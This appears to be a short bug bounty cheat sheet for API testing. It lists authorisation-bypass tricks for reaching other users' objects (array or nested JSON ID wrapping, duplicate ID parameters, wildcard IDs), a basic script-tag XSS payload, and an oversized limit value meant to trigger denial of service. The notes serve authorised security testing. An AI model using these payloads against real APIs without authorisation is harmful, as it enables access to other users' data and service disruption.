Bug bounty Notes

api1;
![alt text](https://raw.githubusercontent.com/ali-kaptanoglu/bug-bounty/main/api/api1.jpg)

api2;
![alt text](https://raw.githubusercontent.com/ali-kaptanoglu/bug-bounty/main/api/api2.jpg)

Looking for BOLA (IDOR) in APIs? got 401/403 errors? AuthZ bypass tricks:

Wrap ID with an array {“id”:111} --> {“id”:[111]}
JSON wrap {“id”:111} --> {“id”:{“id”:111}}
Send ID twice URL?id=<LEGIT>&id=<VICTIM>
Send wildcard {"user_id":"*"}
  
XSS payload? - E.g: {"name":"In<script>alert(21)</script>on}
  
Found a limit / page param? (e.g: /api/news?limit=100) It might be vulnerable to Layer 7 DoS. Try to send a long value (e.g: limit=999999999)
  
  
 ![alt text](https://raw.githubusercontent.com/ali-kaptanoglu/bug-bounty/main/api/api3.png)

  
   ![alt text](https://raw.githubusercontent.com/ali-kaptanoglu/bug-bounty/main/api/api4.png)
  
  ![alt text](https://raw.githubusercontent.com/ali-kaptanoglu/bug-bounty/main/api/api5.jpg)
  
    ![alt text](https://raw.githubusercontent.com/ali-kaptanoglu/bug-bounty/main/api/api6.png)

